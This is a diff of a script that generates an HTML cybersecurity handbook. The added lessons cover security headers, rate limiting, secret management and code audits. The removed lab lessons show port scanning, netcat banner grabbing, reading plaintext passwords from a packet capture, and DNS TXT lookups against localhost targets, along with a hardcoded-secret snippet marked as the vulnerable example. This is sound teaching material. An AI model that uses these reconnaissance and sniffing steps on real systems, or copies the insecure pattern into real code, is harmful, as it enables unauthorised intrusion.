+        title: '3.5 Hardening HTTP Headers: Shielding Browsers in Code',
+        slug: 'secure-headers',
+        concept: 'Programmatic HTTP Defense-in-Depth Implementation',
+        incident: 'In 2018, attackers used XSS and missing Content Security Policy headers on the British Airways website to inject Magecart skimming scripts, stealing payment card details from 380,000 transactions.',
+        lecture: `
+          Security headers should not be an afterthought left to the production operations team. 
+          As a software engineer, you should bake defense-in-depth headers directly into your application framework 
+          so that your code runs safely in every environment, from local staging to cloud production.
+        `,
+        underTheHood: `
+          How modern frameworks configure browser policy:
+          <pre><code>// Standardizing security headers in Express:
+app.use((req, res, next) => {
+  // Prevent framing in clickjacking attacks:
+  res.setHeader('X-Frame-Options', 'DENY');
+
+  // Prevent MIME-type sniffing:
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+
+  // Enforce Content Security Policy:
+  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
+
+  // Referrer privacy:
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+
+  next();
+});</code></pre>
+        `,
+        playbook: `
+          Automating header configuration with <code>helmet</code>:
+          <pre><code>import helmet from 'helmet';
+
+// Apply 15+ industry-standard security headers in one line:
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],
+      objectSrc: ["'none'"],
+      upgradeInsecureRequests: [],
+    },
+  },
+  frameguard: { action: 'deny' },
+}));</code></pre>
+        `,
+        defense: `
+          <strong>Continuous CI/CD Header Scanning:</strong>
+          Include automated tools like OWASP ZAP or curl assertion scripts in your automated build pipeline 
+          to immediately fail builds if security headers are removed by accident.
+        `,
+        question: 'What is the purpose of the "upgrade-insecure-requests" directive in a Content Security Policy header?'
+      },
+      {
+        id: 'secure-rate-limit',
+        title: '3.6 Defending Availability: Rate Limiting & Throttling',
+        slug: 'secure-rate-limit',
+        concept: 'Token Bucket Rate Limiting & Denial-of-Service Defense',
+        incident: 'Credential stuffing attacks against major consumer banking and airline apps routinely bombard login endpoints with millions of leaked password combinations when rate limiting is absent.',
+        lecture: `
+          The "CIA Triad" is the foundational pillar of cybersecurity: <strong>Confidentiality</strong>, <strong>Integrity</strong>, and <strong>Availability</strong>.
+          <br><br>
+          A system can have perfect encryption (Confidentiality) and mathematically flawless validation (Integrity), 
+          but if an attacker can flood your server with 100,000 requests per second and crash the CPU, the service is useless. 
+          Defending <strong>Availability</strong> requires implementing <strong>Rate Limiting</strong>.
+        `,
+        underTheHood: `
+          The <strong>Token Bucket Algorithm</strong>:
+          <div class="callout analogy">
+            Imagine a bucket that can hold a maximum of 10 tokens. Every second, a faucet drips 1 new token into the bucket. 
+            When a user makes an API request, they must spend 1 token. 
+            If they make a burst of 10 quick requests, they spend all 10 tokens and the bucket is empty. 
+            If they immediately attempt an 11th request, the server returns <strong>HTTP 429 Too Many Requests</strong>. 
+            They must wait for the faucet to drip new tokens into the bucket before they can proceed.
+          </div>
+        `,
+        playbook: `
+          Implementing an in-memory sliding window rate limiter in Express:
+          <pre><code>const rateLimitMap = new Map();
+
+function rateLimiter(req, res, next) {
+  const ip = req.ip;
+  const now = Date.now();
+  const windowMs = 60 * 1000; // 1 minute window
+  const maxRequests = 10;     // Max 10 requests per minute
+
+  if (!rateLimitMap.has(ip)) {
+    rateLimitMap.set(ip, []);
+  }
+
+  const timestamps = rateLimitMap.get(ip).filter(time => now - time &lt; windowMs);
+  
+  if (timestamps.length &gt;= maxRequests) {
+    res.setHeader('Retry-After', '60');
+    return res.status(429).json({ error: 'Too many requests. Please slow down.' });
+  }
+
+  timestamps.push(now);
+  rateLimitMap.set(ip, timestamps);
+  next();
+}
+
+app.use('/api/login', rateLimiter);</code></pre>
+        `,
+        defense: `
+          <strong>Distributed Rate Limiting at Scale:</strong>
+          In multi-server production environments, in-memory Maps cannot share state across load balancers. 
+          Implement distributed rate limiting using Redis (via <code>ioredis</code> or Cloudflare / API Gateway edge rate limiters).
+        `,
+        question: 'Why is rate limiting by IP address alone vulnerable to evasion, and what additional identifiers should be combined with IP?'
+      },
+      {
+        id: 'secure-hide-secret',
+        title: '3.7 Secrets Hygiene & Environmental Configuration: Safe Safekeeping',
+        slug: 'secure-hide-secret',
+        concept: '12-Factor App Secret Management & Elimination of Hardcoded Credentials',
+        incident: 'In 2022, an attacker stole Uber\'s entire AWS infrastructure access because a contractor had committed hardcoded administrator API credentials into a private PowerShell script stored on a network share.',
+        lecture: `
+          Every year, automated bots crawl public GitHub repositories within milliseconds of code being pushed. 
+          If you commit an AWS access key, a Stripe secret token, or a database password into your Git history, 
+          it will be harvested and exploited before you even realize you made a mistake.
+          <br><br>
+          Rule number one of professional software engineering: <strong>Never hardcode secrets in source code. Ever.</strong>
+        `,
+        underTheHood: `
+          According to the industry-standard <strong>12-Factor App Methodology</strong>, configuration and secrets must be strictly separated from code.
+          <ul>
+            <li>Secrets must be injected into the application process via <strong>Environment Variables</strong> at runtime.</li>
+            <li>Local development uses a <code>.env</code> file that is <strong>strictly ignored in .gitignore</strong>.</li>
+            <li>Production deploys inject secrets via encrypted secret managers (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault).</li>
+          </ul>
+        `,
+        playbook: `
+          Implementing fail-fast environment secret loading in Node.js:
+          <pre><code>// ❌ VULNERABLE (Hardcoded Secret in Source Code):
+const JWT_SECRET = "super_secret_master_key_12345";
+
+// ✅ SECURE (Environment Variable with Fail-Fast Validation):
+import dotenv from 'dotenv';
+dotenv.config();
+
+const REQUIRED_SECRETS = ['JWT_SECRET', 'DATABASE_URL', 'FLAG_HMAC_SECRET'];
+
+for (const secret of REQUIRED_SECRETS) {
+  if (!process.env[secret]) {
+    console.error(\`FATAL ERROR: Environment variable \${secret} is missing!\`);
+    process.exit(1); // Fail fast! Never boot in an insecure state.
+  }
+}
+
+export const JWT_SECRET = process.env.JWT_SECRET;</code></pre>
+        `,
+        defense: `
+          <strong>Automated Secret Scanning in CI/CD:</strong>
+          Deploy automated pre-commit hooks and GitHub secret scanners (like <code>TruffleHog</code> or <code>Gitleaks</code>) 
+          that automatically block commits containing patterns resembling private keys, API tokens, or high-entropy strings.
+        `,
+        question: 'If you accidentally commit a secret key to Git, why does simply making a new commit that deletes the line fail to secure the credential?'
+      },
+      {
+        id: 'secure-full-review',
+        title: '3.8 The Master Craftsman: Holistic Defensive Code Audit',
+        slug: 'secure-full-review',
+        concept: 'Comprehensive Security Auditing & Full-Spectrum Remediation',
+        incident: 'Comprehensive code reviews conducted before deployment prevented countless catastrophic vulnerabilities from ever reaching production environments at organizations with mature DevSecOps cultures.',
+        lecture: `
+          You have mastered individual vulnerability classes: SQL injection, Cross-Site Scripting, Insecure Direct Object References, 
+          client validation bypasses, missing security headers, rate limiting, and secret hygiene.
+          <br><br>
+          In the real world, vulnerabilities do not announce themselves in neat, isolated chapters. 
+          A real production codebase is a sprawling ecosystem of hundreds of interacting files. 
+          As a Master Craftsman, you must read an entire server implementation, identify multiple interacting flaws across all layers, 
+          and engineer a unified, hardened release.
+        `,
+        underTheHood: `
+          The Professional Code Audit Checklist:
+          <table>
+            <thead>
+              <tr>
+                <th>Audit Layer</th>
+                <th>Checklist Item</th>
+                <th>Verification Question</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>1. Secrets</strong></td>
+                <td>Environment Configuration</td>
+                <td>Are all database passwords and API tokens loaded from <code>process.env</code> with fail-fast guards?</td>
+              </tr>
+              <tr>
+                <td><strong>2. Database</strong></td>
+                <td>SQL Parameterization</td>
+                <td>Are prepared statements used exclusively without any string concatenation?</td>
+              </tr>
+              <tr>
+                <td><strong>3. Output</strong></td>
+                <td>Contextual Encoding</td>
+                <td>Are user-supplied variables escaped before insertion into HTML templates?</td>
+              </tr>
+              <tr>
+                <td><strong>4. AuthZ</strong></td>
+                <td>Object-Level Authorization</td>
+                <td>Does every route verify that the authenticated user owns the requested record?</td>
+              </tr>
+              <tr>
+                <td><strong>5. Validation</strong></td>
+                <td>Server-Side Boundaries</td>
+                <td>Are numeric types, bounds, and string payloads rigorously validated on the backend?</td>
+              </tr>
+              <tr>
+                <td><strong>6. Availability</strong></td>
+                <td>Rate Limiting</td>
+                <td>Are login, authentication, and heavy compute endpoints throttled against brute-force attacks?</td>
+              </tr>
+              <tr>
+                <td><strong>7. Headers</strong></td>
+                <td>Defense in Depth</td>
+                <td>Are CSP, X-Frame-Options, and nosniff headers active across all responses?</td>
+              </tr>
+            </tbody>
+          </table>
+        `,
+        playbook: `
+          Conducting an end-to-end security code review:
+          <ol>
+            <li><strong>Map the Entry Points:</strong> Identify all exposed HTTP routes (<code>app.get</code>, <code>app.post</code>). Trace user input from request parameter to database query to response.</li>
+            <li><strong>Trace the Data Flow (Taint Analysis):</strong> Treat all external input (<code>req.body</code>, <code>req.query</code>, <code>req.headers</code>) as "tainted". Verify that input is sanitized before reaching sensitive "sinks" (database, filesystem, HTML response).</li>
+            <li><strong>Apply Holistic Fixes:</strong> Refactor all identified vulnerabilities simultaneously. Run comprehensive automated test suites to ensure security fixes do not break legitimate business functionality.</li>
+          </ol>
+        `,
+        defense: `
+          <strong>Building a Culture of Secure Engineering:</strong>
+          Security is not a checkbox completed before launch; it is a mindset woven into every architecture meeting, 
+          every pull request code review, and every line of code written. 
+          When you write code that is secure by design, you protect millions of people who will rely on your software for decades to come.
+        `,
+        question: 'What is the concept of "Shift Left" in modern DevSecOps, and why is fixing a security defect in development 100x cheaper than fixing it after a breach?'
+      }
+    ]
+  }
+]
+
+// HTML Template Builder
+function buildHtml() {
+  let html = `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -21,7 +1496,7 @@ const htmlContent = `<!DOCTYPE html>
 <style>
   @page {
     size: letter;
-    margin: 1in;
+    margin: 0.8in;
     @bottom-right {
       content: counter(page);
     }
@@ -29,9 +1504,9 @@ const htmlContent = `<!DOCTYPE html>
 
   body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    color: #1a202c;
-    line-height: 1.6;
-    font-size: 11pt;
+    color: #1e293b;
+    line-height: 1.65;
+    font-size: 10.5pt;
     margin: 0;
     padding: 0;
   }
@@ -47,51 +1522,52 @@ const htmlContent = `<!DOCTYPE html>
     text-align: center;
     background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f766e 100%);
     color: white;
-    padding: 2rem;
+    padding: 3rem;
     box-sizing: border-box;
   }
   .cover h1 {
-    font-size: 32pt;
+    font-size: 34pt;
     font-weight: 800;
     margin: 0 0 1rem 0;
     letter-spacing: -0.025em;
     color: #f8fafc;
+    line-height: 1.15;
   }
   .cover .subtitle {
-    font-size: 16pt;
+    font-size: 15pt;
     font-weight: 300;
     color: #94a3b8;
-    max-width: 600px;
-    margin-bottom: 3rem;
+    max-width: 650px;
+    margin-bottom: 2.5rem;
   }
   .cover .badge {
     background: rgba(20, 184, 166, 0.2);
     border: 1px solid #14b8a6;
     color: #5eead4;
-    padding: 6px 16px;
+    padding: 6px 18px;
     border-radius: 9999px;
-    font-size: 11pt;
+    font-size: 10.5pt;
     font-weight: 600;
     text-transform: uppercase;
-    letter-spacing: 0.05em;
-    margin-bottom: 2rem;
+    letter-spacing: 0.08em;
+    margin-bottom: 2.5rem;
   }
   .cover .meta {
     margin-top: auto;
-    font-size: 11pt;
+    font-size: 10.5pt;
     color: #cbd5e1;
   }
 
-  /* Typography & Layout */
+  /* Typography */
   h1, h2, h3, h4 {
     color: #0f172a;
     font-weight: 700;
     page-break-after: avoid;
   }
   h1 { font-size: 22pt; margin-top: 2rem; border-bottom: 2px solid #e2e8f0; padding-bottom: 0.5rem; }
-  h2 { font-size: 16pt; margin-top: 1.8rem; color: #0d9488; }
-  h3 { font-size: 13pt; margin-top: 1.2rem; }
-  p { margin: 0.8rem 0; text-align: justify; }
+  h2 { font-size: 15pt; margin-top: 1.8rem; color: #0d9488; }
+  h3 { font-size: 12.5pt; margin-top: 1.2rem; color: #1e293b; }
+  p { margin: 0.75rem 0; text-align: justify; }
 
   /* Page Break Helpers */
   .page-break { page-break-after: always; }
@@ -105,7 +1581,7 @@ const htmlContent = `<!DOCTYPE html>
     border: none;
     padding: 0;
     margin: 0;
-    font-size: 26pt;
+    font-size: 25pt;
     color: #0f172a;
   }
   .chapter-header .chapter-tag {
@@ -123,7 +1599,8 @@ const htmlContent = `<!DOCTYPE html>
     padding: 1rem 1.25rem;
     margin: 1.2rem 0;
     page-break-inside: avoid;
-    font-size: 10.5pt;
+    font-size: 10pt;
+    line-height: 1.55;
   }
   .analogy {
     background: #f0fdfa;
@@ -146,12 +1623,20 @@ const htmlContent = `<!DOCTYPE html>
   }
   .defense-rule strong { color: #b91c1c; }
 
-  .why-it-happens {
+  .incident-box {
     background: #fffbeb;
     border-left: 4px solid #f59e0b;
     color: #78350f;
   }
-  .why-it-happens strong { color: #b45309; }
+  .incident-box strong { color: #b45309; }
+
+  .question-box {
+    background: #f5f3ff;
+    border-left: 4px solid #8b5cf6;
+    color: #4c1d95;
+    margin-top: 1.5rem;
+  }
+  .question-box strong { color: #6d28d9; }
 
   /* Code Formatting */
   pre, code {
@@ -162,14 +1647,14 @@ const htmlContent = `<!DOCTYPE html>
     color: #0f172a;
     padding: 0.15rem 0.35rem;
     border-radius: 4px;
-    font-size: 9.5pt;
+    font-size: 9pt;
   }
   pre {
     background: #0f172a;
     color: #f8fafc;
     padding: 1rem;
     border-radius: 8px;
-    font-size: 9pt;
+    font-size: 8.8pt;
     overflow-x: auto;
     page-break-inside: avoid;
     line-height: 1.45;
@@ -186,7 +1671,7 @@ const htmlContent = `<!DOCTYPE html>
     border-collapse: collapse;
     margin: 1.2rem 0;
     page-break-inside: avoid;
-    font-size: 10pt;
+    font-size: 9.5pt;
   }
   th, td {
     padding: 0.6rem 0.8rem;
@@ -204,8 +1689,8 @@ const htmlContent = `<!DOCTYPE html>
 
   /* Challenge Cards */
   .challenge-block {
-    margin-top: 2rem;
-    margin-bottom: 2rem;
+    margin-top: 2.2rem;
+    margin-bottom: 2.2rem;
     page-break-inside: avoid;
     border: 1px solid #e2e8f0;
     border-radius: 8px;
@@ -218,12 +1703,12 @@ const htmlContent = `<!DOCTYPE html>
     justify-content: space-between;
     align-items: center;
     border-bottom: 2px solid #f1f5f9;
-    padding-bottom: 0.5rem;
+    padding-bottom: 0.6rem;
     margin-bottom: 1rem;
   }
   .challenge-title h3 {
     margin: 0;
-    font-size: 14pt;
+    font-size: 13.5pt;
     color: #0f172a;
   }
   .challenge-tag {
@@ -231,7 +1716,7 @@ const htmlContent = `<!DOCTYPE html>
     color: #0369a1;
     padding: 3px 8px;
     border-radius: 4px;
-    font-size: 9pt;
+    font-size: 8.5pt;
     font-weight: 600;
   }
 
@@ -252,7 +1737,7 @@ const htmlContent = `<!DOCTYPE html>
   .toc a {
     color: #0f766e;
     text-decoration: none;
-    font-weight: 600;
+    font-weight: 500;
   }
 </style>
 </head>
@@ -260,694 +1745,200 @@ const htmlContent = `<!DOCTYPE html>
 
 <!-- Cover Page -->
 <div class="cover">
-  <div class="badge">BreachKeep Faculty Curriculum</div>
+  <div class="badge">Comprehensive Cybersecurity Masterclass Edition</div>
   <h1>The Defender's Compass</h1>
-  <div class="subtitle">A Student Handbook to Cybersecurity Foundations: Exploring Networks, the Web, and Secure Engineering Through the BreachKeep Dungeons</div>
+  <div class="subtitle">A Teacher's Guide to Cybersecurity Foundations Across Networks, Web Applications, and Defensive Code</div>
   <div class="meta">
-    <p><strong>Course:</strong> Introduction to Applied Cybersecurity (eLabs)</p>
-    <p><strong>Focus Dungeons:</strong> Signals (Network) &bull; Trading Post (Web) &bull; The Forge (Secure Coding)</p>
-    <p><strong>Target Audience:</strong> Beginners &bull; Aspiring Ethical Hackers &bull; Software Craftsmen</p>
+    <strong>Platform:</strong> BreachKeep Cybersecurity Academy<br>
+    <strong>Audience:</strong> Students, Educators & Aspiring Security Engineers<br>
+    <strong>Author:</strong> The Faculty of Computer Science & Defensive Systems<br>
+    <strong>Coverage:</strong> Signals (Networking), The Trading Post (Web), and The Forge (Secure Coding)
   </div>
 </div>
 
-<!-- Preface -->
+<!-- Welcome Lecture -->
 <div class="page-break">
-  <h1>A Note from Your Teacher: Welcome to the Keep!</h1>
-  <p>Dear Cadet,</p>
-  <p>Welcome to cybersecurity. When people first hear about hacking, their minds often leap to movie clichés: darkened rooms, neon green text cascading across black monitors, and furious typing that miraculously breaks into satellite systems in twelve seconds flat. The reality is both more grounded and far more exciting.</p>
-  <p>Cybersecurity is not digital witchcraft. It is the art and science of understanding how systems communicate, discovering the hidden assumptions that developers and architects make, and observing what happens when those assumptions break down. Every vulnerability you will encounter in BreachKeep was not created by malice, but by a very human developer who was tired, rushed, or unaware of how their code would behave under unexpected pressure.</p>
-  
-  <div class="callout analogy">
-    <strong>The Teacher's Mental Model:</strong>
-    Think of a secure system like a masterfully constructed building. The network is the plumbing and electrical wiring—the conduits through which all energy and information flow. The web application is the public reception desk and front lobby—where the world comes to interact with the building's services. And secure coding is the architectural blueprint and structural engineering—the careful design that ensures a single unlocked window doesn't cause the entire building to collapse.
+  <h1>The Teacher's Welcome: Learning to See the Matrix</h1>
+  <p>
+    Welcome to your journey into cybersecurity. If you are reading this handbook, you have taken your first conscious step 
+    into one of the most intellectually exhilarating disciplines in human history.
+  </p>
+  <p>
+    Most people interact with modern technology as passive consumers. They tap on glowing rectangles of glass, swipe through feeds, 
+    and trust that when they enter a credit card number into a browser, an invisible army of digital angels protects their life savings. 
+    They see the world like the inhabitants of the Matrix: a seamless, comfortable illusion.
+  </p>
+  <p>
+    <strong>A cybersecurity engineer sees the code.</strong>
+  </p>
+  <p>
+    When you open a web page, you will no longer see just pretty colors and buttons. You will see an HTTP/1.1 or HTTP/2 transport stream. 
+    You will see Ethernet frames and IP packets hopping across undersea fiber-optic cables through regional routers. You will see 
+    the browser's parsing engine building an in-memory Document Object Model (DOM) tree, evaluating untrusted JavaScript, and passing 
+    queries to a relational database engine. You will see where the trust boundaries lie, where human programmers made logical assumptions, 
+    and where those assumptions can fail.
+  </p>
+
+  <div class="callout teacher-tip">
+    <strong>The Core Educational Philosophy of This Book:</strong>
+    <ol>
+      <li><strong>No Magic, Only Systems:</strong> Computers are not mystical black boxes. Every behavior—including every security vulnerability—is the mathematical result of human software obeying precise rules.</li>
+      <li><strong>Understand Before You Exploit:</strong> A script kiddie copies a command from a forum without knowing what it does. A real security engineer understands the underlying protocol RFCs, memory layouts, and state machines so deeply that the solution becomes self-evident.</li>
+      <li><strong>The Ultimate Goal is Defense:</strong> We study attack vectors not to cause chaos, but to become unbreakable defenders. The world desperately needs builders who can forge systems that protect people's privacy, safety, and rights.</li>
+    </ol>
   </div>
 
-  <p>In this handbook, we will walk through three core dungeons of BreachKeep together:</p>
-  <ol>
-    <li><strong>The Network Dungeon ("Signals"):</strong> Learning how machines whisper across physical and virtual wires, how ports act as apartment doors, and how packets can be intercepted, read, and shaped.</li>
-    <li><strong>The Web Dungeon ("The Trading Post"):</strong> Exploring the modern browser and server relationship, understanding stateless HTTP, and breaking common misconceptions about client-side safety.</li>
-    <li><strong>The Secure Coding Dungeon ("The Forge"):</strong> Transitioning from an attacker who breaks systems to a master craftsperson who builds resilient, unassailable software that protects users and data.</li>
-  </ol>
-  <p>Do not be afraid to make mistakes. A broken script, an error 500, or a denied connection is not a failure; it is data. It is the system telling you exactly how it thinks. Let's take our first steps together.</p>
-
+  <h2>Table of Contents</h2>
   <div class="toc">
-    <h3>Table of Contents</h3>
     <ul>
-      <li><strong>Part I: The Network Dungeon &mdash; Signals</strong>
-        <ul>
-          <li>Chapter 1: The Anatomy of a Connection</li>
-          <li>Challenges 1&ndash;10: Ports, Scans, Banners, Packets, DNS, HTTP, Protocol Analysis, Firewalls, Forensics, &amp; Pivoting</li>
-        </ul>
-      </li>
-      <li><strong>Part II: The Web Dungeon &mdash; The Trading Post</strong>
-        <ul>
-          <li>Chapter 2: The Web Architecture &amp; The Illusion of Client Trust</li>
-          <li>Challenges 1&ndash;10: Recon, DevTools, Cookies, Client Trust, IDOR, SQLi, Reflected XSS, Headers, Stored XSS, &amp; Exploit Chains</li>
-        </ul>
-      </li>
-      <li><strong>Part III: The Secure Coding Dungeon &mdash; The Forge</strong>
-        <ul>
-          <li>Chapter 3: The Defensive Engineer's Mindset</li>
-          <li>Challenges 1&ndash;8: Prepared Statements, Sanitization, Ownership Checks, Input Validation, CSP, Rate Limiting, Secret Management, &amp; Full Code Audits</li>
-        </ul>
-      </li>
+      <li><strong>Chapter 1: Signals — Computer Networking & Protocol Analysis</strong> (10 Deep-Dive Labs)</li>
+      <li><strong>Chapter 2: The Trading Post — Web Applications & The OWASP Top 10</strong> (10 Deep-Dive Labs)</li>
+      <li><strong>Chapter 3: The Forge — Secure Coding & Defensive Architecture</strong> (8 Deep-Dive Labs)</li>
     </ul>
   </div>
 </div>
+`
 
-<!-- PART I: NETWORK DUNGEON -->
-<div class="page-break">
-  <div class="chapter-header">
-    <div class="chapter-tag">Part I &bull; Dungeon 3</div>
-    <h1>The Network Dungeon: Whispers on the Wire</h1>
-  </div>
-
-  <h2>Chapter 1: How Computers Talk Across the Void</h2>
-  <p>Before we touch a terminal, let's understand what a network actually is. A network is simply a group of computers agreed upon a common set of rules (protocols) to exchange messages. If you send a physical letter to a friend, you write an address (street name and number), place a stamp on it, and hand it to the postal service. The postal service doesn't care what is written inside the letter; its only job is reading the envelope and delivering it to the right destination.</p>
-
-  <div class="callout analogy">
-    <strong>Real-World Analogy: IP Addresses &amp; Ports</strong><br>
-    Imagine an IP address is the physical street address of a massive apartment complex (e.g., <code>10.200.1.5</code>). If you only provide the street address, the mail carrier can reach the building lobby, but they don't know who receives the letter.
-    <br><br>
-    <strong>Port numbers are the apartment numbers</strong> (e.g., Apartment 80, Apartment 22, Apartment 53). When a letter arrives at the building, the apartment number tells the system which specific tenant (service or daemon) the packet is addressed to.
-  </div>
-
-  <p>In Linux networking, services listen on specific ports. Standard port conventions include:</p>
-  <ul>
-    <li><strong>Port 22 (SSH):</strong> The secure shell for remote administration.</li>
-    <li><strong>Port 53 (DNS):</strong> The domain name system phonebook.</li>
-    <li><strong>Port 80 (HTTP):</strong> Plaintext web traffic.</li>
-    <li><strong>Port 443 (HTTPS):</strong> Encrypted web traffic over TLS.</li>
-  </ul>
-  <p>Now, let's examine the 10 challenges in the Signals dungeon and discover how attackers and defenders navigate this landscape.</p>
-
-  <!-- Challenge 1: network-ports -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 1: What's Listening Behind the Door? (network-ports)</h3>
-      <span class="challenge-tag">Mandatory &bull; Socket Enumeration</span>
-    </div>
-    <p><strong>The Story &amp; Context:</strong> You log into a remote host. You are told that several services are bound and listening on the machine, but you don't know which port hosts the authentic keep service and which ones are merely decoys or telemetry probes.</p>
-    
-    <div class="callout teacher-tip">
-      <strong>Teacher's Lesson &mdash; Socket Investigation:</strong><br>
-      How do you ask a Linux kernel "What programs are currently waiting for incoming network connections?" We use socket statistics tools: <code>ss</code> or <code>netstat</code>.
-      <br><br>
-      The command <code>ss -tulpn</code> breaks down as:
-      <ul>
-        <li><code>-t</code>: Display <strong>TCP</strong> sockets.</li>
-        <li><code>-u</code>: Display <strong>UDP</strong> sockets.</li>
-        <li><code>-l</code>: Show only <strong>listening</strong> sockets (waiting for a connection).</li>
-        <li><code>-p</code>: Show the <strong>process</strong> using the socket (requires root).</li>
-        <li><code>-n</code>: Show <strong>numeric</strong> port numbers instead of attempting to resolve names.</li>
-      </ul>
-    </div>
-
-    <p><strong>The Hands-on Path:</strong></p>
-    <pre><code>student@signals:~$ ss -ltn
-State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port
-LISTEN  0       128         127.0.0.1:2451            0.0.0.0:*
-LISTEN  0       128         127.0.0.1:3120            0.0.0.0:*
-LISTEN  0       128         127.0.0.1:5678            0.0.0.0:*
-LISTEN  0       128         127.0.0.1:8290            0.0.0.0:*</code></pre>
-    <p>Once you see the open ports, how do you talk to them? You use <code>netcat</code> (<code>nc</code>), known in cybersecurity as the Swiss Army Knife of networking. Running <code>nc 127.0.0.1 5678</code> opens a raw TCP connection, allowing you to read the server's immediate greeting.</p>
-  </div>
-
-  <!-- Challenge 2: network-scan -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 2: Mapping the Dark House (network-scan)</h3>
-      <span class="challenge-tag">Mandatory &bull; Port Scanning &amp; Nmap</span>
-    </div>
-    <p><strong>The Concept &amp; Intuition:</strong> In the real world, you cannot log into the target machine to run <code>ss -ltn</code>. You are on the outside looking in. Port scanning is like walking down the hallway of an office building at night and gently turning every door handle to see which offices are unlocked.</p>
-
-    <div class="callout analogy">
-      <strong>The TCP Three-Way Handshake:</strong><br>
-      TCP connections are polite conversations that require three steps:
-      <ol>
-        <li><strong>SYN (Synchronize):</strong> "Hello! May I talk to you?" (Sent by client).</li>
-        <li><strong>SYN-ACK (Synchronize-Acknowledge):</strong> "Yes, I hear you and I'm open!" (Sent by server if port is open).</li>
-        <li><strong>ACK (Acknowledge):</strong> "Great, let's begin!" (Sent by client).</li>
-      </ol>
-      If the port is closed, the server replies with <strong>RST (Reset)</strong>: "Go away, nobody lives here."
-    </div>
-
-    <p><strong>Using Nmap:</strong> To map our target at <code>127.0.0.2</code>, students use <code>nmap</code>:</p>
-    <pre><code>student@signals:~$ nmap -sT -p 1-10000 127.0.0.2
-Starting Nmap ( https://nmap.org )
-Nmap scan report for 127.0.0.2
-PORT     STATE SERVICE
-2100/tcp open  echo
-3400/tcp open  daytime
-7890/tcp open  unknown</code></pre>
-    <p>Students learn that scanning reveals services without ever touching the server's console. Connecting to port 7890 exposes the hidden vault service.</p>
-  </div>
-
-  <!-- Challenge 3: network-banner -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 3: Reading the Welcome Mat (network-banner)</h3>
-      <span class="challenge-tag">Fingerprinting &bull; Banner Grabbing</span>
-    </div>
-    <p><strong>The Concept:</strong> Knowing a port is open is only half the battle; what software is running behind it? Many network daemons eagerly announce their software name, version, and operating system the moment a client connects. This is called a <strong>service banner</strong>.</p>
-    
-    <div class="callout why-it-happens">
-      <strong>Why Do Services Announce Themselves?</strong><br>
-      Historically, protocol specifications (like FTP and SMTP) encouraged software to identify itself for administrative diagnostics. In modern security, however, broadcasting <code>Apache 2.4.49</code> or <code>OpenSSH 7.2p2</code> tells an attacker the exact patch level and known CVE vulnerabilities of your server!
-    </div>
-    <p>Students use <code>nc -nv &lt;ip&gt; &lt;port&gt;</code> or <code>curl -I</code> to capture these banners and identify the specific service version harboring credentials.</p>
-  </div>
-
-  <!-- Challenge 4: network-capture -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 4: The Transparent Postal System (network-capture)</h3>
-      <span class="challenge-tag">Packet Sniffing &bull; Tshark &amp; Wireshark</span>
-    </div>
-    <p><strong>The Concept:</strong> When data travels over a network wire or Wi-Fi channel, it is broken into discrete units called <strong>packets</strong>. If communication is not encrypted (e.g., plain HTTP, FTP, or Telnet), anyone positioned between the sender and receiver can read every single byte.</p>
-    
-    <div class="callout analogy">
-      <strong>Postcards vs. Wax-Sealed Letters:</strong><br>
-      Plain HTTP is like writing a message on a postcard. Every mail carrier, sorting clerk, and bystander who handles the postcard can read your message without tearing an envelope. HTTPS (TLS) is like placing the message inside an indestructible, tamper-evident steel safe that only the intended recipient can unlock.
-    </div>
-
-    <p><strong>The Hands-on Path:</strong> Students inspect a packet capture file (<code>capture.pcap</code>) using command-line Wireshark (<code>tshark</code>):</p>
-    <pre><code>student@signals:~$ tshark -r capture.pcap -Y "http.request or http.response"
-  1   0.000000    10.0.0.2 -> 10.0.0.1    HTTP GET /login HTTP/1.1
-  2   0.004512    10.0.0.1 -> 10.0.0.2    HTTP HTTP/1.1 200 OK (text/html)
-  3   0.012930    10.0.0.2 -> 10.0.0.1    HTTP POST /login HTTP/1.1 (application/x-www-form-urlencoded)</code></pre>
-    <p>By inspecting packet #3 with <code>tshark -r capture.pcap -T fields -e text</code>, students see raw passwords sent across the wire in plaintext, teaching the non-negotiable necessity of TLS.</p>
-  </div>
-
-  <!-- Challenge 5: network-dns -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 5: The Internet's Phonebook (network-dns)</h3>
-      <span class="challenge-tag">DNS Reconnaissance &bull; Dig &amp; TXT Records</span>
-    </div>
-    <p><strong>The Concept:</strong> Humans are terrible at remembering numbers like <code>142.250.190.46</code>, but great at remembering names like <code>google.com</code>. The Domain Name System (DNS) is the global directory that translates names to IP addresses.</p>
-    <p>DNS supports many record types:</p>
-    <ul>
-      <li><strong>A Records:</strong> Maps a domain to an IPv4 address.</li>
-      <li><strong>MX Records:</strong> Mail Exchangers that receive email.</li>
-      <li><strong>TXT Records:</strong> Arbitrary text metadata, often used for domain verification, SPF email safety, and internal administrator notes.</li>
-    </ul>
-    <p>Students use the <code>dig</code> tool to query a local DNS server and uncover hidden configuration strings stored inside TXT records:</p>
-    <pre><code>student@signals:~$ dig @127.0.0.1 -p 53 internal.keep.lan TXT +short
-"ARCHIVE::dns_z0n3_tr4nsf3r_...::"</code></pre>
-  </div>
-
-  <!-- Challenge 6: network-http -->
-  <div class="challenge-block">
-    <div class="challenge-title">
-      <h3>Challenge 6: The Language of the Web (network-http)</h3>
-      <span class="challenge-tag">Protocol Mechanics &bull; Curl &amp; Headers</span>
-    </div>
-    <p><strong>The Concept:</strong> Web browsers hide the raw HTTP protocol behind pretty graphics. In cybersecurity, we must strip away the browser and speak directly to web servers using terminal tools like <code>curl</code>.</p>
